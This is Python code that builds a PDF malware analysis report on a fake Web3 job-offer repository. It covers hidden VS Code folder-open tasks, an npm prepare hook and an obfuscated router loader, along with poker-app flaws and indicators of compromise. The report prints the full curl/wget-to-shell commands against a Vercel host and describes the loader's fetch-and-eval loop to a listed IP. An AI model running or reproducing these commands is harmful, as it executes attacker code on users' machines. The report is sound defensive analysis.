    story.append(h2("Severity at a glance"))
    story.append(flow_image(figures["severity"], max_height=3.6 * inch))
    story.append(caption(
        "Figure 1. Twelve findings. Critical means the code can run an attacker’s program on the reviewer machine. High means a serious product or trust failure that does not, by itself, execute remote code. Counts are of discrete findings in this report, not of raw pattern matches."
    ))

    story += [
        h1("3.  Scope, method, and limits"),
        rule(),
        h2("In scope"),
        P(
            "The review covered the archive as it sat on disk: both package manifests, editor configuration, the server entry point, route and controller files, middleware, the socket layer, the poker rules in game/, the wallet helper, the connect-wallet page, configuration, and the README. The question was intentional hostility first, and ordinary weakness second."
        ),
        h2("Method"),
    ]
    story += bullets([
        "Inventory of the tree, including extensions that the README implies should exist and do not.",
        "Read of both package.json files, with attention to lifecycle scripts. prepare, preinstall, and postinstall are the usual places a hostile package starts itself.",
        "Read of .vscode/tasks.json and .vscode/settings.json. Tasks with runOn set to folderOpen were treated as executable content, not as editor preferences.",
        "Search across JavaScript and JSON for process execution, eval, Function, fromCharCode, remote fetch of shell scripts, wallet signing methods, token approvals, and hard-coded webhooks.",
        "Offline decode of the single obfuscated region in routes/api/auth.js. The file builds Buffer and Function from character codes, XOR-decodes a hex blob with a key stored beside it, and passes the result to Function. The review performed only the decode and read the resulting text. The result was not passed to Function or eval, and it was deleted afterward.",
        "Manual read of login, registration, token middleware, socket events, raise and rebuy handling, and the wallet page.",
        "SHA-256 of the files that carry the loaders, the install hook, the README, and the login handler.",
    ])
    story += [
        h2("Explicitly not done"),
        P(
            "npm install was not run. The server was not started. The editor tasks were not run. The Vercel host and the IP address embedded in the loader were not contacted, including with a browser or a one-off download. Contacting them would have revealed this machine to the operator and could have returned a program whose only safe place is a dedicated malware lab. A dependency CVE review with npm audit was not run for the same reason: the install hook fires on install. Version numbers were read from the manifests only."
        ),
        h2("Limits"),
        P(
            "The program served by the two remote hosts was not observed. This report can say what the local code does with that response — it executes it — and cannot say which files a follow-on program would read or where it would send them. Editor tasks with runOn folderOpen do not run in current Visual Studio Code unless automatic tasks are allowed. The default is off, and the editor asks. Likelihood for F-01 and F-02 is therefore 4 rather than 5. A reviewer who has previously chosen “allow automatic tasks,” or who approves the prompt, is at the higher end of that score. Some forks of the editor differ. This review did not measure the editor’s current setting on this machine."
        ),
        P(
            "The poker logic was reviewed at the handlers that move chips, seats, and identity. It was not a line-by-line audit of every React component. Styling, card art, and localization files were sampled only far enough to see that long lines in those files are SVG paths, not a second encoded payload. The search for a second obfuscated blob found one location only: the authentication router."
        ),
        h2("Confidence"),
        P(
            "Confidence is high on the local loaders, because their behavior is visible after a straightforward decode and a direct read of the task file. Confidence is high that the README is not a description of this code. Confidence is moderate on the operational purpose of the remote stages, because that inference comes from the shape of the local droppers and from the job-offer context, not from a captured sample. Confidence is high on the application defects that were read directly, and those are scoped to the functions named in each finding."
        ),
    ]

    story += [
        h1("4.  What the archive claims to be"),
        rule(),
        P(
            "The README introduces “Zyranova” as a decentralized metaverse where people explore, create, and transact in a tokenized world. It lists NFT ownership, provably fair play, 3D worlds, avatars, and a cross-platform client. Badges claim Node.js 18, React 18, Polygon, Solidity 0.8.20, and an MIT license. A “current state” section names PostgreSQL, MongoDB, IPFS, and a team of four frontend developers, two blockchain developers, two backend developers, and a technical manager. The stack section adds Next.js, Three.js, Babylon.js, Tailwind, TypeScript, Redis, Hardhat, Unity, Phaser, Python 3.12, and a product called Modex BCDB. The architecture section adds soulbound tokens, voice, and an analytics engine."
        ),
        P(
            "The archive is a JavaScript poker application. The client is React 16.13.1 with react-scripts 3.4.3, not React 18 and not Next.js. The server is Express 4 with a socket layer and an in-memory table. A Mongoose user model exists. server.js never connects to a database. There is no contracts directory, no Hardhat or Foundry config, no Solidity, no Python, no TypeScript, no Redis client, no Unity project, and no license file. The client package is marked UNLICENSED. The root package sets private to the string \"true\" rather than a boolean."
        ),
        P(
            f"A walk of the tree found {ctx['file_count']} files. Extensions that a blockchain and analytics product would normally include were absent: {zero_langs}. The files that do exist are JavaScript, SCSS, SVG-heavy React components, card images, and two package manifests."
        ),
    ]
    story.append(flow_image(figures["extensions"], max_height=4.5 * inch))
    story.append(caption(
        f"Figure 2. Extension counts across {ctx['file_count']} files. JavaScript and styling dominate. The languages named in the README for contracts and analytics do not appear."
    ))
    story.append(flow_image(figures["claims"], max_height=6.4 * inch))
    story.append(caption(
        "Figure 3. Each row is something the README asserts or something the archive actually contains. Tan means the README mentions it. Navy means the files are there. The product claims fail. The two hostile mechanisms are present and unmentioned. React, Express, and a Mongo model are the overlap, and even that overlap is thinner than the README: the Mongo model is unused at startup, and the React version is 16, not 18."
    ))
    story += [
        h2("The instructions are part of the lure"),
        P(
            "The Quick Start tells the reader to clone, run npm install, run npm start, and open http://localhost:3000. That first command is the install hook in F-04. The documented URL is the React development server, which the root scripts do not start cleanly: the root manifest has no start script that matches “npm start.” It has dev, start:backend, and start:frontend. start:frontend itself runs npm install inside client before the dev server. Ports disagree with each other. The client proxy is http://localhost:5001. config.js defaults the API port to 7777. server.js falls back to 3030 if that value is missing. Nothing in the root scripts listens on 3000 except the separate React tool, and only after its own install."
        ),
        P(
            "Two leftovers in .gitignore point at a repackaged tree rather than a product written as Zyranova. The ignore list contains .git, which has no useful effect inside a repository, and it names a German PowerPoint lock file, ~$WIFI-Projekt Präsentation.pptx, plus an Excel lock file under loca/. Those names are residue from other work. They are consistent with a poker codebase that was copied, given a new README, and fitted with the loaders."
        ),
        h2("Wallet code that does not touch a wallet"),
        P(
            "The job-offer framing implies a Web3 application a reviewer would connect a wallet to. The only browser wallet calls in the client are in client/src/utils/interact.js. That helper requests eth_chainId, eth_requestAccounts, and wallet_switchEthereumChain. It does not request a signature, a token approval, a permit, or a transfer. The page that is actually routed as ConnectWallet does not call that helper. It reads walletAddress, gameId, and username from the query string and emits them on the socket. A reviewer who followed only the UI would never be asked to sign. Theft of a wallet, if it happened, would come from the remote stage after a loader ran, not from a transaction buried in this client. That negative finding matters: it keeps the response aimed at the workstation and at credentials already on it, rather than at a contract address that does not exist here."
        ),
    ]

    story += [
        h1("5.  How the loaders are reached"),
        rule(),
        P(
            "Three paths in the archive end in remote code execution. Two of them start when an editor loads the folder, if automatic tasks are permitted. The third starts when a person follows the README. Two of the three paths converge on the same JavaScript loader. The shell path does not. A machine can be hit by either family, or by both."
        ),
    ]
    story.append(flow_image(figures["chain"], max_height=3.8 * inch))
    story.append(caption(
        "Figure 4. Each row is a path that is fully described in the repository. Darker cells are later stages. The install task and the manual install both end in the authentication-router loader. The shell task is a separate download, aimed at a different host, and it does not need Node."
    ))
    story += [
        h2("Path A — folder open, shell task"),
        P(
            "Visual Studio Code and editors that share its task runner read .vscode/tasks.json. The task labeled env is a shell task. Its runOptions say runOn folderOpen. Its presentation block sets reveal to silent, echo to false, focus to false, close to true, and showReuseMessage to false. A person looking at the editor window is not supposed to see a terminal. The command depends on the operating system. Windows fetches a URL with curl and pipes the body into cmd. The curl invocation disables certificate revocation checks. macOS fetches a different URL and pipes it into bash. Linux uses wget and pipes into sh. The host is the same in all three."
        ),
        code_block(
            "Windows: curl --ssl-no-revoke -L https://api-checking-1.vercel.app/api/settings/windows | cmd\n"
            "macOS:   curl -L 'https://api-checking-1.vercel.app/api/settings/mac' | bash\n"
            "Linux:   wget -qO- 'https://api-checking-1.vercel.app/api/settings/linux' | sh"
        ),
        P(
            f"The commands are hidden in the file by whitespace. {gap_note}. A reviewer who reads the left edge of those lines sees a normal operating-system key and a brace. The command sits far to the right, past a normal window width, and word wrap is turned off in .vscode/settings.json (editor.wordWrap is off). That setting is what makes the padding work."
        ),
        h2("Path B — folder open, install task"),
        P(
            "The same file contains a second folderOpen task, labeled version-update. It runs npm install --silent --no-progress with the workspace as the working directory. Presentation is silent. On Windows it selects cmd.exe. On macOS and Linux it selects bash. This task does not itself contain a URL. It does not need to. npm install in this folder runs the prepare script, and the prepare script starts the server that loads Path C’s loader. Allowing automatic tasks therefore opens two downloads, not one."
        ),
        h2("Path C — the authentication router"),
        P(
            "routes/index.js mounts routes/api/auth.js at /api/auth. server.js calls the route setup on startup, before it listens. Any normal start of the server loads the router. The router file is 20 lines of ordinary Express code followed, on the last line, by a long gap and an obfuscated program. The program resolves Buffer and Function through globalThis and String.fromCharCode, so a search for the words Buffer( or Function( does not hit it. It decodes a hex string with a repeating XOR key stored in the same expression, then calls the decoded text as a function with require supplied as the argument."
        ),
        P(
            f"The concealment is numerical as well as visual. The file is {ctx['auth_line_count']} lines and {ctx['sizes']['auth']:,} bytes. Line 20 is {ctx['auth_line20_length']:,} characters. The readable statement module.exports = router; is followed by {ctx['auth_gap']:,} spaces before the payload. The module still exports the router. The payload is a side effect of loading the file, so the application appears to import cleanly."
        ),
        P(
            "The decoded program sets a server URL of http://88.216.57.122:8080 and a team identifier 6cd9a1e17f045d11ec4e0b102bc04f9d. It replaces console.log, info, warn, error, debug, and trace with empty functions, and it replaces process.stdout.write and process.stderr.write the same way. It copies the URL and the team identifier into the environment as AHA_SERVER and AHA_TEAM. It then loops. Each pass requests /api/runners/start/javascript from that host, with a 15-second abort. If the response is non-empty, it evaluates the body as JavaScript and, if that result is a promise, waits for it. On any failure it waits three seconds and tries again. The loop stops only when a fetched script runs without throwing."
        ),
        callout(
            "<b>What this means.</b> The local file is a silent, persistent dropper. It will keep asking until the host answers, and it will run whatever JavaScript comes back, with the Node require function available. Logging has been switched off first, so the process does not announce the failure or the success. The follow-on program was not retrieved. Data theft is the usual purpose of this arrangement in a fake hiring exercise, and it is the right assumption for containment. It is an assumption, not an observation of that program.",
            border=colors.HexColor("#6B3A2A"),
            bg="#F8F3EE",
        ),
        h2("The install hook that joins Path B and Path C"),
        P(
            "The root package.json prepare script is:"
        ),
        code_block('prepare: start /b node server || nohup node server &'),
        P(
            "npm runs prepare after install. On Windows, start /b node server launches the server in the background and returns. On a Unix shell, the part before the OR operator fails and nohup node server & is what remains. The script is a one-liner written to do the wrong thing on both families of operating system: start the server where the reviewer cannot see it. Because server.js loads the router, the dropper runs as part of “installing dependencies.” The README’s first instruction is that install."
        ),
        P(
            "node_modules is not present in this copy, and there is no evidence in the tree that prepare has completed here. That does not say anything about another copy, another machine, or an editor that already ran the folder-open tasks. Those questions are answered from process history, shell history, and network logs, not from the absence of a folder."
        ),
        h2("Why the two hosts both matter"),
        P(
            "api-checking-1.vercel.app is used only by the shell task. 88.216.57.122 is used only by the JavaScript loader. Blocking one leaves the other. The shell task also does not need the Node loader to succeed: a failure of npm install would not stop curl from piping a script into cmd. The JavaScript loader uses cleartext HTTP, so the fetched program is visible to anything on the path, and the host can change the program per request without a certificate to pin."
        ),
        P(
            "The shape — a Web3 company that does not exist in the code, a silent folder-open task that pipes a Vercel URL into a shell, and a concealed JavaScript loader — matches public reporting on fake job approaches aimed at cryptocurrency developers. This assessment does not attribute the sample to a named group. The second stage was not collected, and no separate infrastructure study was done."
        ),
    ]

    story += [
        h1("6.  Malware findings"),
        rule(),
        P(
            "These four findings are one incident. They are split so each file can be quarantined, hashed, and explained on its own. Likelihood is the chance the path runs during an ordinary look at the project. Impact is what that run allows. Both are scored from 1 to 5."
        ),
    ]

    story.append(finding_banner(FINDINGS[0]))
    story += [
        P(
            "<b>What is there.</b> .vscode/tasks.json defines a shell task named env. runOn is folderOpen. The presentation options suppress the terminal. The Windows command downloads https://api-checking-1.vercel.app/api/settings/windows with curl --ssl-no-revoke -L and pipes the response into cmd. macOS pipes the mac URL into bash. Linux pipes the linux URL into sh via wget -qO-."
        ),
        P(
            "<b>Why it is hostile.</b> A task that runs on folder open, hides its terminal, and pipes a remote body into a shell is remote code execution aimed at the person who opens the project. Disabling revocation checks on Windows makes a broken or intercepted certificate less likely to stop curl. The three URLs let the operator ship a different script per operating system."
        ),
        P(
            "<b>Concealment.</b> Each command is on the same line as the operating-system key, after a long run of spaces. Combined with word wrap disabled in the workspace settings, the dangerous part is off-screen in a default editor layout. The task label is env, which looks like environment setup."
        ),
        P(
            "<b>Impact.</b> The downloaded script runs as the user who opened the folder, with that user’s files, tokens, SSH keys, and browser profiles available to it. The script itself is not in the archive."
        ),
        P(
            "<b>Likelihood.</b> 4. Current Visual Studio Code does not run folderOpen tasks until automatic tasks are allowed. The file is written to succeed the moment they are."
        ),
    ]

    story.append(finding_banner(FINDINGS[1]))
    story += [
        P(
            "<b>What is there.</b> A second task, version-update, is also runOn folderOpen, also silent, and runs npm install --silent --no-progress in the workspace folder. The shell is cmd.exe on Windows and bash on macOS and Linux."
        ),
        P(
            "<b>Why it is hostile.</b> The command is a normal developer command, which is why it works as camouflage. In this archive, npm install is not safe: prepare starts node server, and the server loads the loader in F-03. The silent flags remove the progress output that might make a person look at the terminal."
        ),
        P(
            "<b>Impact.</b> Same end state as following the README, reached without a typed command, if automatic tasks are allowed. It also installs the dependency tree, which is a further supply-chain exposure, though the intentional hook is the immediate issue. This review did not audit transitive packages, because installing them runs the hook."
        ),
        P(
            "<b>Relationship.</b> F-02 is the bridge between the editor and F-03. Removing the prepare script and leaving this task would make the task merely unwanted. Leaving the prepare script and removing this task would leave the README path intact. Both have to be treated as live."
        ),
    ]

    story.append(finding_banner(FINDINGS[2]))
    story += [
        P(
            "<b>What is there.</b> routes/api/auth.js exports an Express router and then, on the same line, runs an obfuscated program. The program decodes to a loop that fetches JavaScript from http://88.216.57.122:8080/api/runners/start/javascript and evaluates it. Console and standard streams are disabled first. The environment receives AHA_SERVER and AHA_TEAM. The team value is 6cd9a1e17f045d11ec4e0b102bc04f9d. Failures retry every three seconds. A 15-second timeout bounds each attempt."
        ),
        P(
            "<b>Why it is hostile.</b> Evaluating a network response is remote code execution, and the retry loop makes it durable across a host that is down at the moment of install. Silencing logs removes the symptom a developer would notice: a server that prints nothing while it phones home. Passing require into the evaluated script gives the remote code the ability to load Node modules, including filesystem and network modules, without further help from this file."
        ),
        P(
            f"<b>Concealment.</b> {ctx['auth_gap']:,} spaces separate the export from the payload on a {ctx['auth_line20_length']:,}-character line. API names are assembled with String.fromCharCode. The file still exports a working router, and the rest of the application imports it in the ordinary way. A review that stops at module.exports = router; never sees the loader. The router’s import list asks controllers/auth.js for setApiKey and verify. That controller does not export either name. The dead import sits above the payload and is easy to mistake for unfinished feature work."
        ),
        P(
            "<b>Trigger.</b> Loading the module is the trigger. server.js loads routes on startup. The prepare script and the start:backend script both start that file. A test harness or a REPL that requires the router would also trigger it."
        ),
        P(
            "<b>What was not observed.</b> The body returned by /api/runners/start/javascript. Do not fetch it on a machine you care about in order to “see what it does.”"
        ),
    ]

    story.append(finding_banner(FINDINGS[3]))
    story += [
        P(
            "<b>What is there.</b> The root package.json prepare script is start /b node server || nohup node server &. There is no corresponding script in client/package.json. The client’s start script does not contain this hook. The dangerous install is the one at the repository root, which is the one the README orders first."
        ),
        P(
            "<b>Why it is hostile.</b> prepare is a lifecycle script. It runs for a normal npm install, which is the command a careful reviewer still expects to be safe to type. start /b and nohup & are both ways to detach a process so the install looks finished while node server continues. The command is split with || so the Windows form and the Unix form share one string."
        ),
        P(
            "<b>Impact.</b> A successful install starts the loader in F-03 under the installer’s account, in the background, with logging suppressed by the loader itself. The person sees a normal install, or a slightly odd one, and the process remains."
        ),
        P(
            "<b>Related scripts.</b> dev runs the backend and the frontend together through npx --yes concurrently. start:backend is node ./server. start:frontend runs npm install inside client and then the React dev server. None of those are safe to use as a workaround. dev and start:backend load the same router. npx --yes concurrently is an extra network fetch of a package, which is ordinary in isolation and unnecessary to invoke here."
        ),
    ]

    story += [
        h2("Dependency versions, read and not installed"),
        P(
            "The manifests pin an old application stack. These versions are recorded because they show a dormant project with a new hostile layer added, not because this review exploited them. They were not installed."
        ),
    ]
    story.append(
        styled_table(
            ["Package", "Declared version", "Where", "Note"],
            [
                ["express", "4.17.1", "root", "Server framework"],
                ["mongoose", "5.10.2", "root", "Imported by a model the server never connects"],
                ["jsonwebtoken", "8.5.1", "root", "Login and socket imports"],
                ["socket.io", "2.3.0", "root and client", "Real-time table"],
                ["axios", "1.4.0 / 0.20.0", "root / client", "Client copy is the older line"],
                ["ethers", "6.15.0 / 5.6.4", "root / client", "Server dependency is unused by the loader path; client helper is ethers v5"],
                ["react", "16.13.1", "client", "README says React 18"],
                ["react-scripts", "3.4.3", "client", "Create React App generation matching React 16"],
                ["lodash", "4.17.20", "root", "Used by the poker table"],
                ["dotenv", "8.2.0", "root", "Pointed at a path that is not in the tree"],
            ],
            [1.35 * inch, 1.25 * inch, 1.15 * inch, 3.3 * inch],
        )
    )
    story.append(P(
        "helmet is commented out in middleware and is not a dependency. xss-clean is present. That package has been deprecated for years and does not fix cross-site scripting in a JSON API. It is listed in the control chart as a weak control that happens to be wired in, not as a mitigation of the loaders."
    ))

    story += [
        h1("7.  Application defects"),
        rule(),
        P(
            "The defects in this section are in the poker application the README is wrapped around. Several of them are the kind of bug a take-home security review is built to contain: an authentication check that was replaced with a constant, a game rule that trusts a number from the client, a socket that never asks who is speaking. They are documented because they are real, and because a reviewer who found only these would have found the bait and missed the loaders."
        ),
        P(
            "They do not steal a browser wallet by themselves. The chip logic moves in-memory play-money. The login bug matters only if the server is running and a JWT secret is configured — and a running server has already executed F-03. Do not start the server to confirm these defects."
        ),
    ]

    story.append(finding_banner(FINDINGS[4]))
    story += [
        P(
            "controllers/auth.js reads email and password from the body and looks up the user by email. If no user exists it returns “Invalid credentials.” If the user exists, the next statement is const isMatch = true, followed by a log of that constant. The password is never passed to bcrypt.compare, even though bcrypt is imported and registration in controllers/users.js does hash passwords with a salt of 10. The failure branch under isMatch is unreachable. jwt.sign then runs with config.JWT_SECRET and the configured expiry."
        ),
        P(
            "On a stock checkout that secret is likely unset. config.js loads dotenv from ./server/config/local.env only when NODE_ENV is not production, and that path is not in the archive. JWT_SECRET is process.env.JWT_SECRET with no fallback. jsonwebtoken will not mint a usable token from an empty secret in current versions; it throws. The defect is still that the password is ignored whenever a secret is present. A missing user and a wrong password are also distinguishable, because only the missing user is rejected. That is an account-enumeration bug sitting on top of the bypass."
        ),
        P(
            "middleware/auth.js logs the raw x-auth-token header on every authenticated request. The log line is console.log(token) before the token is checked. Combined with F-03’s silencing of console inside the same process, that log is less useful to an operator on a machine where the loader has already run, and it remains a credential leak in any log pipeline that captures stdout before the loader replaces the write functions. Order of startup is: the router module loads and silences console, then later requests are logged with the replaced console.log, which discards them. The source defect remains."
        ),
    ]

    story.append(finding_banner(FINDINGS[5]))
    story += [
        P(
            "socket/index.js accepts lobby, table, chat, rebuy, stand, and sit-in or sit-out events with no token check. CS_FETCH_LOBBY_INFO trusts walletAddress, socketId, gameId, and username from the client. The server stores a Player under the client-supplied socket id, keyed by the client-supplied wallet address. Nothing checks a signature, a session, or even that socketId equals the connection’s own id. A later lookup uses that address as the player’s identity. Two connections that present the same address cause the older entry to be deleted."
        ),
        P(
            "Table actions (fold, check, call, raise, leave, rebuy) use the connection’s socket.id to find a player, which is better than trusting an id in the body, but the player was created from client-supplied profile fields. Chat events broadcast text and a userInfo object into the room or the table with no authentication and no check that the sender is seated. Missing-table lookups are not guarded: several handlers call methods on tables[tableId] directly. An unknown id throws and can tear down the handler. That is a robustness bug, recorded here rather than as its own finding."
        ),
    ]

    story.append(finding_banner(FINDINGS[6]))
    story += [
        P(
            "game/Table.js rebuyPlayer adds the supplied amount to a seat’s stack. The only check is that the seat exists. The socket handler CS_REBUY passes the client’s seatId and amount through and then adjusts the player bankroll by the opposite of that amount. There is no check that the amount is positive, that it is within a buy-in cap, or that the socket owns the seat."
        ),
        P(
            "Seat.raise computes the difference between the requested amount and the current bet. It returns early only when that difference is greater than the stack. A requested amount below the current bet produces a negative difference, the guard does not trip, the stack increases, and the bet shrinks. Table.handleRaise computes the pot change from the same pair of numbers before calling raise, so the pot moves by that same negative figure. The server will move chips from the pot to the player when the client names a figure below the current bet."
        ),
        P(
            "The live sit-down path is not the commented-out socket event. Joining a table calls an internal sitDown with the current player count as the seat id and the table limit as the amount. That is a logic error of a different kind: seat assignment follows arrival order, and the buy-in is a constant, not a checked balance. The commented handler would have trusted a client amount directly. It is not registered. Impact is scored 3 because these are in-memory chips in a server that has no ledger and no chain. They show intentional or reckless trust of the client. They are not an on-chain drain."
        ),
    ]

    story.append(finding_banner(FINDINGS[7]))
    story += [
        P(
            "The README is an instrument, not documentation. It asserts a staffed Polygon metaverse, a Solidity code base, and a quick start whose first command triggers F-04. It does not mention editor tasks or a modified auth router. Figure 3 is the evidence. The social-engineering impact is scored high because the document is what causes a careful person to type the dangerous command and to treat the archive as a legitimate review target. There is no separate “team” to contact inside this tree. No names, no governance documents, and no license file support the claims."
        ),
    ]

    story.append(finding_banner(FINDINGS[8]))
    story += [
        P(
            "config.js exports JWT_SECRET and MONGO_URI straight from the environment. The dotenv path is ./server/config/local.env, which this archive does not contain. There is no check at startup that the secret is present and long enough. JWT_TOKEN_EXPIRES_IN is passed into jwt.sign from config, but config.js as written does not export JWT_TOKEN_EXPIRES_IN. Registration and login both pass that missing property through as the expiry option."
        ),
        P(
            "middleware/index.js enables JSON parsing, cookie-parser, express-mongo-sanitize, xss-clean, a rate limit of 100 requests per 10 minutes, hpp, and cors() with no origin argument. cors() without options reflects permissive cross-origin behavior suitable for a local demo and unsuitable for any browser-facing API that holds a session. The helmet import is commented out, and helmet is not installed. The rate limit is global and modest. It is a real control against casual flooding and it does nothing for the loader, which does not arrive over this API."
        ),
        P(
            "The auth middleware’s console.log of the bearer token is part of this finding. Secrets in log lines leave the process boundary as soon as logging is shipped anywhere."
        ),
    ]

    story.append(finding_banner(FINDINGS[9]))
    story += [
        P(
            "client/src/pages/ConnectWallet/ConnectWallet.js waits until the socket is connected, then reads walletAddress, gameId, and username from the page query string. If all three are present it stores the address in React context and emits CS_FETCH_LOBBY_INFO. It then navigates to /play. There is no call to connectMetamask, no personal_sign, and no check that the address belongs to a connected provider. Anyone who can open the URL can present any address. interact.js, which does talk to window.ethereum, is unused by this page."
        ),
        P(
            "wallet_switchEthereumChain in the unused helper would take REACT_APP_CHAIN_ID from the environment and pass it to the wallet. That is a network-switch request, not a transfer. It is noted so a later reader does not mistake it for a drainer. The page a victim would actually land on never reaches it."
        ),
    ]

    story.append(finding_banner(FINDINGS[10]))
    story += [
        P(
            "CS_LOBBY_CHAT emits the client’s text and userInfo to everyone in the game id. TABLE_MESSAGE broadcasts message and from to every seated socket. There is no length limit in the handler, no authentication, and no separation between a system message and a player message. The client that renders those strings was not fully audited for HTML injection. The server behavior is enough to record: the socket is an open relay of whatever text a connected browser sends, to every other connected browser at that table or in that lobby id."
        ),
    ]

    story.append(finding_banner(FINDINGS[11]))
    story += [
        P(
            "config/db.js defines connectDB with mongoose.connect and then process.exit(-1) on failure. server.js does not import it. Registration, login, and the free-chips controller all call the User model. On a server that somehow reached those routes without the loader being the larger problem, they would fail because Mongoose has no connection. The free-chips handler adds INITIAL_CHIPS_AMOUNT (100,000) when the stored balance is zero or below. That rule is ordinary for a play-money faucet. It is unreachable for the same reason."
        ),
        P(
            "This finding is low because it makes the advertised application fail, and because the failure is overshadowed by the code that runs first. It is included so the archive is not mistaken for a working service that happens to contain bugs."
        ),
    ]

    story += [
        h2("Controls that do exist"),
        P(
            "The middleware stack is not empty. A rate limit, a Mongo operator sanitizer, and an HTTP parameter-pollution filter are installed and mounted. Registration validates email shape and a minimum password length, and it hashes the password. HTTP routes that use validateToken do reject a missing header. Those controls are real and they are aimed at a normal web API. They are not mounted in front of the loader, the editor tasks, or the socket events. Figure 7 draws the split."
        ),
    ]
    story.append(flow_image(figures["controls"], max_height=5.2 * inch))
    story.append(caption(
        "Figure 5. Green bars are controls that are actually wired up. Red bars are controls named by the code’s comments or required by the design, and absent. “Password hashing library imported” is deliberately separate from “password actually compared.” The library is on the login file. The comparison is not."
    ))

    story += [
        h1("8.  Reading the charts"),
        rule(),
        h2("Category"),
    ]
    story.append(flow_image(figures["category"], max_height=4.4 * inch))
    story.append(caption(
        "Figure 6. Authentication accounts for three findings because identity is broken in the HTTP login, the socket layer, and the wallet page. Malware execution and supply chain are split so the shell task is not collapsed into the npm hook. They are one outcome."
    ))
    story.append(h2("Likelihood and impact"))
    story.append(flow_image(figures["risk"], max_height=5.6 * inch))
    story.append(caption(
        "Figure 7. Every finding is likely if its code path is exercised, so the horizontal axis only separates “runs when that feature is used” (5) from “runs on folder open only if automatic tasks are allowed” (4). The vertical axis is the damage once reached. F-01 through F-04 sit at the top. F-07 is high-likelihood and lower impact because the chips are not assets. F-11 and F-12 sit lower because an open chat relay and a database that never connects do less harm than code execution."
    ))
    story.append(h2("Component effects"))
    story.append(flow_image(figures["heatmap"], max_height=5.4 * inch))
    story.append(caption(
        "Figure 8. Scores are 0 to 5 and are judgments from the static review, using the same scale for every cell. Code execution is 5 only where this repository itself starts an attacker-controlled program. Data exposure for the four loaders is 4, not 5, because the follow-on program was not captured; the local code’s ability to run that program is not in doubt, and its appetite for files is. Tampering is highest in the socket and chip logic. Concealment is highest where whitespace, silent terminals, or silenced logs are used. Reach is 5 where the path is the whole user account, and lower where the effect stays inside a single game server that is not safely runnable."
    ))
    story += [
        P(
            "Use Figure 8 to prioritize cleanup if a copy of the tree has to be retained as evidence. The top four rows are the files and settings to isolate. The lower rows explain the bait. Quarantine decisions should not wait on a patch for the poker bugs."
        ),
    ]

    story += [
        h1("9.  Indicators"),
        rule(),
        P(
            "These are the values a defender can search for in proxy logs, DNS logs, firewall logs, shell history, and process lists. They are the indicators contained in this archive. A follow-on program could add others; those were not seen."
        ),
        h2("Network"),
    ]
    story.append(
        styled_table(
            ["Indicator", "Where it appears", "Role"],
            [
                ["api-checking-1.vercel.app", "tasks.json, three URLs", "Host for the shell-task scripts"],
                ["/api/settings/windows", "Windows task command", "Body is piped into cmd"],
                ["/api/settings/mac", "macOS task command", "Body is piped into bash"],
                ["/api/settings/linux", "Linux task command", "Body is piped into sh"],
                ["88.216.57.122", "Decoded loader", "Host of the JavaScript stage"],
                ["TCP 8080, cleartext HTTP", "Decoded loader", "No TLS on the loader channel"],
                ["/api/runners/start/javascript", "Decoded loader", "Response is evaluated"],
                ["AHA_SERVER", "Process environment, set by the loader", "Copy of the host URL"],
                ["AHA_TEAM", "Process environment, set by the loader", "Team identifier below"],
                ["6cd9a1e17f045d11ec4e0b102bc04f9d", "Decoded loader", "Sent as AHA_TEAM"],
            ],
            [2.35 * inch, 2.15 * inch, 2.55 * inch],
        )
    )
    story += [
        h2("Files and commands"),
        P(
            "Search a suspect machine for the hash values in the appendix, for a node process whose script path ends in this archive’s server.js, and for curl, wget, or cmd lines that contain api-checking-1.vercel.app. Search shell history for npm install run inside this folder. Search the environment of stray node processes for AHA_SERVER. A prepare script containing start /b node server is distinctive enough to search for on its own."
        ),
        h2("What a successful run can look like"),
    ]
    story += bullets([
        "A node process started from this folder, possibly with no console output, still running after npm install has returned.",
        "A short-lived curl.exe or wget whose output was handed to cmd, bash, or sh, as a child of the editor or of a shell the editor started.",
        "DNS or HTTP requests to api-checking-1.vercel.app, or HTTP requests to 88.216.57.122 port 8080, around the time the folder was opened or the install was run.",
        "Editor logs or a user prompt about automatic tasks, if the person approved them. Absence of that prompt does not clear Path C, which needs only npm install or node server.",
    ])
    story.append(Spacer(1, 6))
    story.append(P(
        "This review did not scan the workstation for those signs. The report cannot say whether this machine already ran the tasks. The person reading it is in a better position to know whether the folder was opened in an editor with automatic tasks allowed, and whether install was run."
    ))

    story += [
        h1("10.  What to do"),
        rule(),
        h2("If the archive has only been stored and inspected"),
        P(
            "Leave it unrun. Do not open it in an editor that has automatic tasks enabled. If an editor has already prompted, choose the option that does not run tasks, and disable automatic tasks for this workspace. Do not delete the only copy if you may need it as evidence; move it to a location that is not an editor workspace and not a folder npm will be pointed at. Removing the hostile lines is not a substitute for assuming the worst if a task or an install already happened. A cleaned tree can still be useful as a sample. It is not a project to adopt."
        ),
        h2("If a task may have run, or npm install was run"),
        P(
            "Treat the account and the machine as compromised until an incident response look says otherwise. The sensible order is: disconnect the machine from the network, keep it powered so volatile evidence is not lost if someone qualified is going to image it, and from a different device rotate passwords, SSH keys, personal access tokens, cloud keys, and browser-wallet recovery phrases that existed on the exposed machine. A wallet that was unlocked in a browser on that machine should be treated as exposed even though this repository’s client never asks for a signature. The unknown stage runs with the user’s rights."
        ),
        P(
            "Preserving evidence and returning a machine to service are different jobs. Copying the folder onto a USB drive from the suspect machine can also copy a running process’s access if someone then executes it elsewhere. Handle the copy as malware. Do not “test” it inside a normal developer VM that holds real credentials."
        ),
        h2("Containment of the indicators"),
    ]
    story += bullets([
        "Block outbound HTTP to 88.216.57.122 port 8080, and block the hostname api-checking-1.vercel.app, on the network used by anyone who might still have the folder.",
        "Hunt the indicators in Section 9 on endpoints that opened the archive.",
        "If a node process from this server is running, isolate the machine before killing it if a responder wants a memory image. Killing it stops the retry loop. It does not remove a stage that already wrote itself elsewhere.",
        "Rotate secrets that lived on the machine. Do that from a clean device. Changing a password on the suspect machine can hand the new password to anything still running there.",
    ])
    story.append(Spacer(1, 6))
    story += [
        h2("What not to spend time on"),
        P(
            "Patching the poker bugs, connecting MongoDB, or adding helmet does not make this repository usable. The trust decision failed at the README. A future legitimate code review from an unknown recruiting contact should be done on a machine with no wallets, no SSH agent, no cloud credentials, and no password manager, and the archive should be opened first in a viewer that does not execute editor tasks. The loaders in this sample are placed exactly where a hurried “I’ll just install and click around” workflow will hit them, and exactly where a source-only skim of the left margin will miss them."
        ),
        h2("Disclosure"),
        P(
            "The hosts in Section 9 are attacker infrastructure contained in a malicious sample. This report is for the person who has the archive. It is not a notice to those hosts, and it does not include a copy of the encoded payload."
        ),
    ]

    story += [
        h1("11.  Evidence appendix"),
        rule(),
        h2("File identity"),
        P(
